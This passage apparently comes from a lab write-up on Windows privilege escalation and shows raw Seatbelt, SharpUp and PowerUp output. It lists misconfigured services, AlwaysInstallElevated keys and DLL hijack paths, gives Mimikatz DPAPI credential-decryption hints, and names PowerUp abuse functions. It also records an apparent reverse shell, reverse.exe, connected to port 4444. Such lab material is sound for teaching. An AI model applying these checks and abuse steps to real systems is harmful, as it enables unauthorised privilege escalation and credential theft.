  Interface     : Ethernet (10.10.163.32) --- Index 15
    DNS Servers : 10.0.0.2

    Internet Address      Physical Address      Type
    10.10.0.1             02-C8-85-B5-5A-AA     Dynamic
    10.10.255.255         FF-FF-FF-FF-FF-FF     Static
    224.0.0.22            01-00-5E-00-00-16     Static
    224.0.0.251           01-00-5E-00-00-FB     Static
    224.0.0.252           01-00-5E-00-00-FC     Static
    239.255.255.250       01-00-5E-7F-FF-FA     Static
    255.255.255.255       FF-FF-FF-FF-FF-FF     Static


=== Active TCP Network Connections ===

  Local Address          Foreign Address        State      PID   Service         ProcessName
  0.0.0.0:135            0.0.0.0:0              LISTEN     964   RpcSs           svchost.exe
  0.0.0.0:445            0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:3389           0.0.0.0:0              LISTEN     540   TermService     svchost.exe
  0.0.0.0:5985           0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:47001          0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:49664          0.0.0.0:0              LISTEN     628                   wininit.exe
  0.0.0.0:49665          0.0.0.0:0              LISTEN     1036  EventLog        svchost.exe
  0.0.0.0:49666          0.0.0.0:0              LISTEN     1836  Spooler         spoolsv.exe
  0.0.0.0:49667          0.0.0.0:0              LISTEN     1780  PolicyAgent     svchost.exe
  0.0.0.0:49668          0.0.0.0:0              LISTEN     756                   lsass.exe
  0.0.0.0:49669          0.0.0.0:0              LISTEN     844   SessionEnv      svchost.exe
  0.0.0.0:49670          0.0.0.0:0              LISTEN     736                   services.exe
  10.10.163.32:139       0.0.0.0:0              LISTEN     4                     System
  10.10.163.32:3389      10.8.52.126:59650      ESTAB      540   TermService     svchost.exe
  10.10.163.32:49967     10.8.52.126:4444       ESTAB      5124                  C:\PrivEsc\reverse.exe
  10.10.163.32:49972     40.125.122.176:443     SYN_SENT   844   DsmSvc          svchost.exe


=== Active UDP Network Connections ===

  Local Address          PID    Service                 ProcessName
  0.0.0.0:123            1984   W32Time                 svchost.exe
  0.0.0.0:500            844    IKEEXT                  svchost.exe
  0.0.0.0:3389           540    TermService             svchost.exe
  0.0.0.0:3702           1232   EventSystem             svchost.exe
  0.0.0.0:3702           1232   EventSystem             svchost.exe
  0.0.0.0:4500           844    IKEEXT                  svchost.exe
  0.0.0.0:5353           1292   Dnscache                svchost.exe
  0.0.0.0:5355           1292   Dnscache                svchost.exe
  0.0.0.0:65496          1232   EventSystem             svchost.exe
  10.10.163.32:137       4                              System
  10.10.163.32:138       4                              System
  127.0.0.1:59833        844    iphlpsvc                svchost.exe


=== Non Microsoft Processes (via WMI) ===

  Name           : Seatbelt
  Company Name   : 
  PID            : 5952
  Path           : C:\Privesc\Seatbelt.exe
  CommandLine    : C:\Privesc\SeatBelt  all 
  IsDotNet       : True

  Name           : reverse
  Company Name   : 
  PID            : 5124
  Path           : C:\PrivEsc\reverse.exe
  CommandLine    : C:\PrivEsc\reverse.exe
  IsDotNet       : False



=== Kerberos Tickets (Current User) ===

  [*] Returned 0 tickets


=== Running User Triage Checks ===


 [*] In medium integrity, attempting triage of current user.

     Current user : WIN-QBA94KB3IOF\user - S-1-5-21-3025105784-3259396213-1915610826-1000 


=== Checking for Firefox (Current User) ===



=== Checking for Chrome (Current User) ===



=== Internet Explorer (Current User) Last 7 Days ===

  History:

  Favorites:
    http://go.microsoft.com/fwlink/p/?LinkId=255142


=== Checking Windows Vaults ===

  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials


  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
  Vault Type     : Windows Credentials



=== Saved RDP Connection Information (Current User) ===


=== Recent Typed RUN Commands (Current User) ===



=== Putty Saved Session Information (Current User) ===

    SessionName           :  BWP123F42



=== Putty SSH Host Key Recent Hosts (Current User) ===



=== Checking for Cloud Credentials (Current User) ===



=== Recently Accessed Files (Current User) Last 7 Days ===



=== Checking for DPAPI Master Keys (Current User) ===

    Folder       : C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-3025105784-3259396213-1915610826-1000

    MasterKey    : ced3b33f-849e-4587-8829-fbaf4cd747a7
        Accessed : 6/5/2020 8:38:04 AM
        Modified : 6/5/2020 8:38:04 AM

  [*] Use the Mimikatz "dpapi::masterkey" module with appropriate arguments (/rpc) to decrypt


=== Checking for Credential Files (Current User) ===

    Folder       : C:\Users\user\AppData\Local\Microsoft\Credentials\

    CredFile     : DFBE70A7E5CC19A398EBF1B96859CE5D
    Description  : Local Credential Data
    MasterKey    : ced3b33f-849e-4587-8829-fbaf4cd747a7
    Accessed     : 6/5/2020 8:38:04 AM
    Modified     : 6/5/2020 8:38:04 AM
    Size         : 11152

  [*] Use the Mimikatz "dpapi::cred" module with appropriate /masterkey to decrypt


=== Checking for RDCMan Settings Files (Current User) ===



=== Internet Explorer Open Tabs ===



=== Installed Patches (via WMI) ===

  HotFixID   InstalledOn    Description
  KB4514366  9/7/2019       Update
  KB4512577  9/7/2019       Security Update
  KB4512578  9/7/2019       Security Update


=== Chrome (Current User) ===


=== Firefox (Current User) ===


=== Recycle Bin Files Within the last 30 Days ===



=== Interesting Files (Current User) ===



[*] Completed All Safety Checks in 2 seconds


C:\Users\user>C:\Privesc\SharpUp.exe
C:\Privesc\SharpUp.exe

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Services ===

  Name             : daclsvc
  DisplayName      : DACL Service
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\DACL Service\daclservice.exe"


=== Modifiable Service Binaries ===

  Name             : filepermsvc
  DisplayName      : File Permissions Service
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\File Permissions Service\filepermservice.exe"


=== AlwaysInstallElevated Registry Keys ===

  HKLM:    1
  HKCU:    1


=== Modifiable Folders in %PATH% ===

  Modifable %PATH% Folder  : C:\Temp


=== Modifiable Registry Autoruns ===

  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : C:\Program Files\Autorun Program\program.exe


=== *Special* User Privileges ===



=== Unattended Install Files ===

 C:\Windows\Panther\Unattend.xml


=== McAfee Sitelist.xml Files ===



=== Cached GPP Password ===

  [X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.


[*] Completed Privesc Checks in 0 seconds


C:\Users\user>

```


### PowerUp

```
C:\Users\user>powershell -ep bypass
powershell -ep bypass
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\user> . C:\Privesc\PowerUp.ps1
. C:\Privesc\PowerUp.ps1
PS C:\Users\user> Invoke-AllChecks
Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...


ServiceName   : AWSLiteAgent
Path          : C:\Program Files\Amazon\XenTools\LiteAgent.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AWSLiteAgent' -Path <HijackPath>

ServiceName   : unquotedsvc
Path          : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'unquotedsvc' -Path <HijackPath>





[*] Checking service executable and argument permissions...


ServiceName    : filepermsvc
Path           : "C:\Program Files\File Permissions Service\filepermservice.exe"
ModifiableFile : C:\Program Files\File Permissions Service\filepermservice.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'filepermsvc'





[*] Checking service permissions...


ServiceName   : daclsvc
Path          : "C:\Program Files\DACL Service\daclservice.exe"
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -ServiceName 'daclsvc'





[*] Checking %PATH% for potentially hijackable .dll locations...


HijackablePath : C:\Temp\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Temp\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Users\user\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\user\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll' 
                 -Command '...'





[*] Checking for AlwaysInstallElevated registry key...


OutputFile    : 
AbuseFunction : Write-UserAddMSI





[*] Checking for Autologon credentials in registry...


[*] Checking for vulnerable registry autoruns and configs...


Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
Path           : "C:\Program Files\Autorun Program\program.exe"
ModifiableFile : C:\Program Files\Autorun Program\program.exe





[*] Checking for vulnerable schtask files/configs...


[*] Checking for unattended install files...


UnattendPath : C:\Windows\Panther\Unattend.xml





[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


PS C:\Users\user>
```